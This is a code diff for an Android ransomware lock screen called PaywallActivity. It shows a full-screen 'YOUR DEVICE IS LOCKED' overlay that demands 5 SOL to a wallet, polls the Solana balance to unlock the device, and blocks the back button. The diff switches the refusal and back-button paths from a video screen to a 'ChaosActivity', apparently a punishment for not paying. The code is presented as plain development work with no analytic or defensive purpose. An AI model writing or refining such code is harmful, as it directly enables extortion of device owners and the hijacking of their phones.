@@ -4,7 +4,6 @@ import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.Color;
-import android.media.MediaPlayer;
 import android.net.Uri;
 import android.os.Bundle;
 import android.view.Gravity;
@@ -22,7 +21,7 @@ public class PaywallActivity extends Activity {
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
-        if (paid) { launchVideo(); return; }
+        if (paid) { launchChaos(); return; }
         getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                 | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                 | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
@@ -34,41 +33,29 @@ public class PaywallActivity extends Activity {
                         | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                         | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                         | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
-
         FrameLayout root = new FrameLayout(this);
         root.setBackgroundColor(Color.BLACK);
-
-        // background video = mln.mp4
         bg = new VideoView(this);
         int rid = getResources().getIdentifier("mln", "raw", getPackageName());
         if (rid != 0) {
             Uri u = Uri.parse("android.resource://" + getPackageName() + "/" + rid);
             bg.setVideoURI(u);
-            bg.setOnPreparedListener(mp -> {
-                mp.setLooping(true);
-                mp.setVolume(0f, 0f);
-                bg.start();
-            });
+            bg.setOnPreparedListener(mp -> { mp.setLooping(true); mp.setVolume(0f, 0f); bg.start(); });
         }
-        FrameLayout.LayoutParams flp = new FrameLayout.LayoutParams(
+        root.addView(bg, new FrameLayout.LayoutParams(
                 FrameLayout.LayoutParams.MATCH_PARENT,
-                FrameLayout.LayoutParams.MATCH_PARENT);
-        root.addView(bg, flp);
-
-        // overlay UI
+                FrameLayout.LayoutParams.MATCH_PARENT));
         LinearLayout ui = new LinearLayout(this);
         ui.setOrientation(LinearLayout.VERTICAL);
         ui.setGravity(Gravity.CENTER);
         ui.setBackgroundColor(0x99000000);
         ui.setPadding(48, 48, 48, 48);
-
         TextView title = new TextView(this);
         title.setText("RHF/VNC");
         title.setTextColor(Color.RED);
         title.setTextSize(52);
         title.setGravity(Gravity.CENTER);
         ui.addView(title);
-
         TextView sub = new TextView(this);
         sub.setText("YOUR DEVICE IS LOCKED");
         sub.setTextColor(Color.RED);
@@ -76,13 +63,11 @@ public class PaywallActivity extends Activity {
         sub.setGravity(Gravity.CENTER);
         sub.setPadding(0, 8, 0, 32);
         ui.addView(sub);
-
         ImageView qr = new ImageView(this);
         LinearLayout.LayoutParams qlp = new LinearLayout.LayoutParams(500, 500);
         qr.setLayoutParams(qlp);
         ui.addView(qr);
         loadQr(qr);
-
         TextView addr = new TextView(this);
         addr.setText("Send 5 SOL to:\n" + SolanaCheck.WALLET);
         addr.setTextColor(Color.WHITE);
@@ -90,7 +75,6 @@ public class PaywallActivity extends Activity {
         addr.setGravity(Gravity.CENTER);
         addr.setPadding(0, 24, 0, 24);
         ui.addView(addr);
-
         status = new TextView(this);
         status.setText("Waiting for payment...");
         status.setTextColor(Color.YELLOW);
@@ -98,27 +82,19 @@ public class PaywallActivity extends Activity {
         status.setGravity(Gravity.CENTER);
         status.setPadding(0, 16, 0, 32);
         ui.addView(status);
-
         Button verify = new Button(this);
-        verify.setText("I PAID — CHECK");
+        verify.setText("I PAID - CHECK");
         verify.setOnClickListener(v -> checkNow());
         ui.addView(verify);
-
         Button reject = new Button(this);
-        reject.setText("REJECT — I WILL NOT PAY");
+        reject.setText("REJECT - I WILL NOT PAY");
         reject.setTextColor(Color.RED);
-        reject.setOnClickListener(v -> {
-            rejected = true;
-            launchVideo();
-        });
+        reject.setOnClickListener(v -> { rejected = true; launchChaos(); });
         ui.addView(reject);
-
         root.addView(ui, new FrameLayout.LayoutParams(
                 FrameLayout.LayoutParams.MATCH_PARENT,
                 FrameLayout.LayoutParams.MATCH_PARENT));
         setContentView(root);
-
-        // auto-check tiap 15 detik
         new Thread(() -> {
             while (!paid && !rejected) {
                 try { Thread.sleep(15000); } catch (InterruptedException ignored) {}
@@ -131,7 +107,6 @@ public class PaywallActivity extends Activity {
             }
         }).start();
     }
-
     private void doUnlock() {
         paid = true;
         runOnUiThread(() -> {
@@ -153,17 +128,15 @@ public class PaywallActivity extends Activity {
             android.os.Process.killProcess(android.os.Process.myPid());
         });
     }
-
     private void checkNow() {
         new Thread(() -> {
             long bal = SolanaCheck.getBalance();
             runOnUiThread(() -> status.setText(bal >= 0
                     ? "Balance: " + (bal / 1_000_000_000.0) + " / 5 SOL"
-                    : "RPC error — try again"));
+                    : "RPC error - try again"));
             if (bal >= SolanaCheck.REQUIRED_LAMPORTS) doUnlock();
         }).start();
     }
-
     private void loadQr(ImageView iv) {
         new Thread(() -> {
             try {
@@ -177,14 +150,12 @@ public class PaywallActivity extends Activity {
             } catch (Throwable ignored) {}
         }).start();
     }
-
-    private void launchVideo() {
-        Intent i = new Intent(this, VideoActivity.class);
+    private void launchChaos() {
+        Intent i = new Intent(this, ChaosActivity.class);
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
         startActivity(i);
         finish();
     }
-
     @Override
-    public void onBackPressed() { launchVideo(); }
+    public void onBackPressed() { launchChaos(); }
 }
